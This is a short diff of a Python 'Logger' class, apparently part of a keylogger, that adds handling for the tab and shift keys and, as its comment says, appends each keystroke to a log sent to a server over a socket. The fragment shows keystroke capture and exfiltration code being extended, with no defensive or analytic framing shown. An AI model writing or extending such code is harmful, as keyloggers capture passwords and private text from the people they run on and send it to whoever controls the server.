@@ -20,6 +20,10 @@ class Logger():
       key = "\n"
     elif key == "space":
       key = " "
+    elif key == "tab":
+      key = "  tab  "
+    elif key == "shift":
+      key = "  shift  " 
     #Logging and sending to server
     self.log += key
     self.s.send(self.log.encode())
